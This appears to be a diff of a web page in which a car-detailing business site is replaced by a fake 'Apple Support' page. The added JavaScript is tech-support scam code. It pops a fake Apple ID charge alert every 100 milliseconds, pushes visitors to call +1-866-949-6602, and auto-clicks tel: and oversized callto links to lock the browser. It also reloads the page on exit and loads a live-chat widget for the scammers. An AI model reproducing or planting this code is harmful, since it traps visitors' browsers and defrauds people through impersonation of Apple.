+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-866-949-6602 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
-          </a>
-          <div class="header__blocker--content">
-            <h5>Professional Auto Detailing and Interior Cleaning Services</h5>
-            
-          </div>
-        </div>
-      </header>
-      
-      <div class="parallax-item">
-        <div class="container bigPadd">
-          <div class="row">
-            <div class="col">
-              <div class="contentpar">
-                 <a class="imgMain" href="./"><img
-                  src="service-images/main-detailing-hero.webp"
-                  alt="Professional car detailing and polishing"
-                  class="osnovaImgMain"
-                /></a>
-                <div>
-                  <h1 class="titlOn">
-                    Complete Care for Your Vehicle Inside and Out
-                  </h1>
-                  <p>When a vehicle spends years navigating dusty highways, crowded parking lots, and unpredictable weather, the effects accumulate slowly on every surface. Dust settles deep into the woven fibers of floor carpets, road salt leaves white crusts along the door sills, and microscopic particles dull the clear coat until the paint loses its original depth. Our company, ImpulseIconjos, approaches these challenges through a systematic methodology that treats automobiles not merely as modes of transportation, but as complex engineering pieces deserving of meticulous preservation.</p><p>We believe that true automotive care goes beyond a quick surface wash with soapy water. Every vehicle requires an individualized assessment to identify specific wear patterns, material sensitivities, and areas accumulating stubborn grime. Our team examines the physical condition of the cabin, the texture of the dashboard plastics, and the integrity of the exterior lacquer before any cleaning solution touches the metal.</p><h2>The Philosophy Behind Comprehensive Detailing</h2><p>Modern manufacturing utilizes a vast array of materials inside a single cabin, ranging from aniline leather and brushed aluminum to soft-touch plastics and high-pile carpeting. Treating all these diverse surfaces with a single chemical cleaner inevitably leads to premature degradation, fading, or cracking. Our technicians select specialized formulations tailored specifically for each texture, ensuring that natural oils are preserved rather than stripped away.</p><p>We spend considerable time inspecting hidden zones where debris accumulates unnoticed over the seasons. Seat rails, air conditioning vents, seatbelt mechanisms, and door hinge pockets trap crumbs, dust, and moisture that can eventually cause persistent odors or mechanical friction. By utilizing specialized soft-bristle brushes and compressed air streams, our staff extracts foreign particles from areas that standard hand vacuums fail to reach.</p><ul><li>Deep extraction of embedded dust from carpets</li><li>Conditioning of natural leather seat surfaces</li><li>Gentle steam cleaning of ventilation ducts</li><li>Restoration of faded exterior trim elements</li><li>Polishing of glass surfaces for maximum visibility</li><li>Neutralizing persistent odors at the molecular level</li></ul><h2>Restoring Exterior Brilliance and Protection</h2><p>The exterior paintwork endures a constant barrage of environmental hazards, including ultraviolet radiation, tree sap, industrial fallout, and abrasive road grit. Over time, these elements etch into the clear coat, creating microscopic swirls that scatter light and make the body look hazy. Our workshop employs multi-stage polishing techniques designed to level the clear coat safely, removing surface imperfections without compromising the overall paint thickness.</p><p>Once the finish is optically clear and smooth to the touch, applying a protective barrier becomes essential for preserving the results. We apply professional-grade ceramic coatings and polymer sealants that bond directly with the lacquer, creating a hydrophobic shield against water spots, road grime, and bird droppings. Rainwater beads up and rolls off the treated body panels, carrying loose dirt particles away with it and keeping the vehicle cleaner for longer periods between washes.</p><h2>Interior Hygiene and Fabric Revival</h2><p>The cabin environment directly influences the daily driving experience, making interior cleanliness a matter of personal comfort and well-being. Fabric seats absorb body oils, beverage spills, and airborne pollutants that break down textile fibers from the inside out. Our hot water extraction units flush warm cleaning solutions deep into the seat foam, dissolving trapped contaminants before vacuuming them away into recovery tanks.</p><p>Leather upholstery demands a balanced routine of gentle cleansing followed by nourishing conditioners that restore flexibility and prevent splitting along the bolster seams. We avoid greasy silicone dressings that leave unnatural shiny films and attract dust particles within hours of application. Instead, we use matte-finish conditioning agents that restore the original factory look and supple feel of genuine hides.</p><h2>The Value of Routine Maintenance Sessions</h2><p>Maintaining a pristine vehicle condition requires consistent upkeep rather than occasional drastic interventions. Seasonal temperature shifts cause materials to expand and contract, trapping condensation in floor mats and accelerating oxidation on exterior chrome details. Bringing the vehicle in for scheduled maintenance checks allows our technicians to catch early signs of wear on rubber seals, weatherstripping, and leather bolsters before permanent damage occurs.</p><p>Investing time in professional vehicle care ultimately preserves the structural and aesthetic integrity of your automobile for years of future journeys. Our workshop remains committed to delivering exceptional craftsmanship through steady hands, proper tools, and an unwavering respect for automotive engineering.</p>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
                 </div>
-                 
-              </div>
             </div>
-          </div>
-        </div>
-      </div>
-      <div class="parallax-item footeryz-box">
-        <div class="container bigPadd pad2">
-          <div class="row flex-row">
-            
-            <div class="col">
-              <h3 class="title-h fw-bold">Our People:</h3>
-              <div class="team-box">
-                <div class="team-box__item">
-                  <img src="pics/female-customer-one.webp" alt="" />
-                  <div>
-                    <p>Eleanor Vance</p>
-                    <span>Lead Detailer</span>
-                  </div>
-                </div>
-                <div class="team-box__item">
-                  <img src="pics/male-customer-one.webp" alt="" />
-                  <div>
-                    <p>Arthur Pendelton</p>
-                    <span>Interior Specialist</span>
-                  </div>
-                </div>
-                <div class="team-box__item">
-                  <img src="pics/female-customer-two.webp" alt="" />
-                  <div>
-                    <p>Clara Higgins</p>
-                    <span>Paint Correction Expert</span>
-                  </div>
-                </div>
-                <div class="team-box__item">
-                  <img src="pics/male-customer-two.webp" alt="" />
-                  <div>
-                    <p>Marcus Vance</p>
-                    <span>Quality Inspector</span>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            
-            <div class="col">
-              <h3 class="title-h fw-bold">Blog Notes:</h3>
-              <div class="latest--news">
-                <div class="latest--news__item">
-                  <img src="pics/gallery.jpg" alt="" />
-                  <div  >8 crazy conspiracy theories that have been proven true</div>
-                </div>
-                <div class="latest--news__item">
-                  <img src="pics/car-detailing-service.webp" alt="" />
-                  <div  >4 recipes for juicy homemade ham from different meats</div>
-                </div>
-                <div class="latest--news__item">
-                  <img src="pics/gallery-2.jpg" alt="" />
-                  <div  >20 facts about Japanese roads and drivers that can't be found in the encyclopedia</div>
-                </div>
-                <div class="latest--news__item">
-                  <img src="pics/interior-cleaning.webp" alt="" />
-                  <div  >11 techniques that used to be considered "elite European repair", but today have become tasteless</div>
-                </div>
-              </div>
-            </div>
-            
-          </div>
-        </div>
-      </div>
-      <div class="parallax-item">
-        <div class="container bigPadd">
-          <div class="row myflex">
-            <div class="col">
-              <h3 class="title-h fw-bold">Our Workshop in Numbers:</h3>
-              <div class="stats--wrapper">
-    <div class="stats--wrapper__item transactionjb-tooltip">
-        <div class="progress-inform">
-            <div>Thousands of vehicles serviced</div>
-            <div>1429</div>
-        </div>
-        <div class="progress">
-            <div class="progress-bar bg1 progress-bar-striped progress-bar-animated" role="progressbar" style="width: 90%" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100"></div>
-        </div>
+        </section>
     </div>
-    <div class="stats--wrapper__item transactionjb-tooltip">
-        <div class="progress-inform">
-            <div>Dedicated professional workshop team</div>
-            <div>97312</div>
-        </div>
-        <div class="progress">
-            <div class="progress-bar bg2 progress-bar-striped progress-bar-animated" role="progressbar" style="width: 45%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"></div>
-        </div>
-    </div>
-    <div class="stats--wrapper__item transactionjb-tooltip">
-        <div class="progress-inform">
-            <div>Advanced detailing equipment used</div>
-            <div>2008</div>
-        </div>
-        <div class="progress">
-            <div class="progress-bar bg3 progress-bar-striped progress-bar-animated" role="progressbar" style="width: 31%" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100"></div>
-        </div>
-    </div>
-    <div class="stats--wrapper__item transactionjb-tooltip">
-        <div class="progress-inform">
-            <div>Meticulous multi-stage inspections</div>
-            <div>7842</div>
-        </div>
-        <div class="progress">
-            <div class="progress-bar bg4 progress-bar-striped progress-bar-animated" role="progressbar" style="width: 57%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"></div>
-        </div>
-    </div>
-</div>
-            </div>
-            <div class="col">
-              <div class="opH">
-                <div class="bgImg">
-                  <img src="pics/paint-protection.webp" alt="" />
-                </div>
-                <div>
-                  <h5>Working hours:</h5>
-                  <div class="opH--item">
-                    Monday - Friday: 10.00 - 16.00
-                  </div>
-                  <div class="opH--item">
-                    Saturday - Sunday: 9.00 - 17.00
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-      
-      <div class="parallax-item">
-        <div class="container bigPadd commbyw transactionjb-tooltip">
-          <div class="row">
-            <div class="col">
-              <div class="testom-bloсk">
-                <div>
-                  <div class="testom-bloсk--item">
-                    <div><img src="pics/female-customer-one.webp" alt="" /></div>
-                    <div class="testom-bloсk--item__txt">
-                      <div class="commgfd fst-italic">My sedan looks better today than the afternoon I drove it off the dealership lot. The leather conditioning smells natural and feels wonderfully soft again.</div>
-                      <div>
-                        <p>Eleanor Vance</p>
-                        <span
-                          >09.07.2026</span>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-                <div>
-                  <div class="testom-bloсk--item">
-                    <div><img src="pics/female-customer-two.webp" alt="" /></div>
-                    <div class="testom-bloсk--item__txt">
-                      <div class="commgfd fst-italic">The interior cleaning was thorough beyond my expectations. Every vent, crevice, and cup holder is spotless, and the windows are crystal clear without any streaks.</div>
-                      <div>
-                        <p>Clara Higgins</p>
-                        <span
-                          >09.10.2026</span>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-                <div>
-                  <div class="testom-bloсk--item">
-                    <div><img src="pics/male-customer-one.webp" alt="" /></div>
-                    <div class="testom-bloсk--item__txt">
-                      <div class="commgfd fst-italic">Brought my truck in after a long road trip through muddy trails. The team cleaned every inch of the cabin and restored the exterior paint to a mirror finish.</div>
-                      <div>
-                        <p>Arthur Pendelton</p>
-                        <span
-                          >09.09.2026</span>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-                <div>
-                  <div class="testom-bloсk--item">
-                    <div><img src="pics/female-customer-three.webp" alt="" /></div>
-                    <div class="testom-bloсk--item__txt">
-                      <div class="commgfd fst-italic">Booking was straightforward and the turnaround time was exactly as promised. Our family SUV is ready for daily school runs and road trips once more.</div>
-                      <div>
-                        <p>Beatrice Holloway</p>
-                        <span
-                          >09.20.2026</span>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-                <div>
-                  <div class="testom-bloсk--item">
-                    <div><img src="pics/male-customer-two.webp" alt="" /></div>
-                    <div class="testom-bloсk--item__txt">
-                      <div class="commgfd fst-italic">I really appreciate the attention to detail. They managed to get out old coffee stains from the upholstery that I thought were permanent fixtures of the seat.</div>
-                      <div>
-                        <p>Marcus Vance</p>
-                        <span
-                          >09.10.2026</span>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-      
-      <div class="parallax-item filteruv--menu">
-        <div class="container bigPadd flexfse">
-          <div class="row padfs flex-column">
-             
-            
-            <div class="col padfs-1">
-              <h3 class="title-h fw-bold">Write to us:</h3>
-              <form action="appreciation.php" method="post" class="mychekform">
-                <div class="form-field"><input class="input-user-block__input" type="text" name="nameoffice-info" placeholder="Enter your name" required><input name="emailoffice-info" class="input-user-block__input" type="email" placeholder="Email Address" required></div>
-                <div class="mb-3 form-check">
-                  <input type="checkbox" class="form-check-input" id="Check1" />
-                  <label class="form-check-label" for="Check1"
-                    >I accept <a href="privacyPolicy.html" target="_blank">Privacy policy</a></label>
-                </div>
-                <button type="submit" class="btn-style-4">
-                  Specialist consultation
-                </button>
-              </form>
-            </div>
-            
-          </div>
-          
-        </div>
-        
-         
-        <footer class="container">
-          <div class="row">
-            <div class="col prtva">
-              <p><a href="privacyPolicy.html" target="_blank">Privacy policy</a></p>
-              <p><a href="terms-of-service.html" target="_blank">Terms & Conditions</a></p>
-              <p>
-                <a href="disclaimer.html" target="_blank">Disclaimer</a>
-              </p>
-                
-            </div>
-          </div>
-        </footer>
-      </div>
-    </section>
 
-    <script type="text/javascript" src="folder/script/slick.js"></script>
-    <script type="text/javascript" src="folder/script/lightbox.js"></script>
-    <script type="text/javascript" src="folder/script/script.js"></script>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-866-949-6602
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
     <script>
-      let count = 1;
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-      if(count == 1){
-          $('.commbyw').css('max-width','800px');
-          $('.testom-bloсk--item').css({'flex-direction':'column','align-items':'center','text-align':'center'});
-      }else{
-          $('.testom-bloсk--item').css({'margin':'20px'});
-      }
 
-      $('.testom-bloсk').slick({
-          dots: true,
-          infinite: false,
-          speed: 300,
-          slidesToShow: count,
-          arrows: false,
-          slidesToScroll: 1,
-          responsive: [
-              {
-              breakpoint: 1024,
-              settings: {
-                  slidesToShow: 1,
-                  slidesToScroll: 1,
-                  infinite: true,
-                  dots: true
-              }
-              },
-              {
-              breakpoint: 600,
-              settings: {
-                  slidesToShow: 1,
-                  slidesToScroll: 1
-              }
-              } 
-          ]
-          });
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-      const parallax = document.getElementById("parallax");
-      window.addEventListener("scroll", function () {
-        let offset = window.pageYOffset;
-        parallax.style.backgroundPositionY = offset * 0.7 + "px";
-      });
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-866-949-6602');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-949-6602"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-866-949-6602 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
     </script>
-    
 
 
-    
-  </body>
-</html>
 
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
